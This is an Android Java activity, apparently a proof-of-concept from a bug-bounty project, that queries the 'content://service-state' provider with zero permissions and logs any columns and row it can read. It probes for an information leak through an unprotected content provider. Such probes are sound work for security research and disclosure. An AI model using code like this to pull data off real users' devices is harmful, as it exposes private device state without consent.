package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class ServiceStateProbeActivity extends Activity {
    private static final String T = "SVCSTATE_PROBE";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== ServiceStateProvider zero-permission query probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        ContentResolver cr = getContentResolver();
        Uri uri = Uri.parse("content://service-state");
        try (Cursor c = cr.query(uri, null, null, null, null)) {
            if (c == null) {
                Log.w(T, "[-] query returned null cursor");
                return;
            }
            Log.w(T, "[+] query succeeded, columns=" + c.getColumnCount());
            String[] cols = c.getColumnNames();
            StringBuilder sb = new StringBuilder();
            for (String col : cols) sb.append(col).append(",");
            Log.w(T, "  columns: " + sb);
            if (c.moveToFirst()) {
                StringBuilder row = new StringBuilder();
                for (int i = 0; i < c.getColumnCount(); i++) {
                    row.append(cols[i]).append("=").append(c.getString(i)).append(" | ");
                }
                Log.w(T, "  row: " + row);
            } else {
                Log.w(T, "  no rows");
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] SecurityException: " + se.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] Exception: " + e);
        }
    }
}
